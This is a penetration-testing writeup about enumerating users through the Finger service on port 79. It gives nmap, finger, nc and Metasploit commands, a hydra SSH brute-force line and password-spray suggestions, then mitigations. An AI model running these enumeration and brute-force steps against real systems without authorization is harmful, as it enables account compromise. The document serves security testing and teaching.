# 🧪 Finger Service Exploitation (Port 79)

**Type:** Internal Penetration Test  
**Service:** Finger (TCP/79)  
**Goal:** User Enumeration and Information Disclosure  
**Author:** NIKHIL  
 
---
## 📘 Overview

The Finger service is a legacy protocol that provides information about users on a remote system.  
When exposed, it allows unauthenticated user enumeration and can leak details such as home directories, login times, and shell paths — all of which are valuable for further exploitation.


## 🎯 Objectives

- Enumerate valid usernames via the Finger protocol.
- Extract user-specific information (login time, shell, etc.).
- Use discovered usernames for credential attacks (brute-force, spray).
- Demonstrate real-world risk and recommend mitigation.

---

## 🧰 Tools Used

| `finger`     | Manual user enumeration            |  
| `nc` (Ncat)  | Raw queries and banner grabbing    |  
| Metasploit   | Automated enumeration via wordlists|  
| `hydra`      | Password brute-forcing (post-enum) |  

---

## 📡 Finger Enumeration Methodology

### 🔍 Step 1: Service Detection
```
nmap -p 79 -sV 192.168.1.109
```
# 🔎 Step 2: Manual Finger Queries
```
finger admin@192.168.1.109
```
Login: admin         Name: Administrator
Directory: /home/admin     Shell: /bin/bash
Last login Thu Jul 4 09:12 (UTC) on tty1
```
nc -vn 192.168.1.109 79
```
# 🤖 Step 4: Automated Enumeration (Metasploit)
```
msfconsole
use auxiliary/scanner/finger/finger_users
set RHOSTS 192.168.1.109
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run
```
[*] 192.168.1.109 - Found valid user: admin
[*] 192.168.1.109 - Found valid user: guest

#💣 Post-Enumeration Exploitation
🔐 SSH Brute Force (Example)
```
hydra -L users.txt -P rockyou.txt ssh://192.168.1.109
```
🔁 Credential Reuse / Password Spray

Use usernames with common passwords on other services like:

    FTP (port 21)
    SMB (port 445)
    RDP (port 3389)
    Web logins

📋 Vulnerability Summary
ID	Title	Severity	CWE	CVSS (Est.)
FINGER-001	User Enumeration via Finger	High	CWE-200 (Information Exposure)	6.5
🛠 Mitigation

    Disable Finger:
```
sudo systemctl stop finger
sudo systemctl disable finger
```
    Block Port 79 on firewalls (internal and external).
    Monitor for legacy services in production networks.
    Harden access to user data and remove unnecessary daemons.
🧩 Red Team Notes

    Finger leaks idle time → can infer user activity.
    Combine with:
       SNMP enum
        /etc/passwd via file leaks
        Kerberos-based attacks (e.g., ASREPRoast)
    Useful in lab networks, legacy systems, or CTF challenges.

📎 References

    RFC 742 - Finger Protocol
    Metasploit Docs - finger_users Module
    SecLists - Usernames List
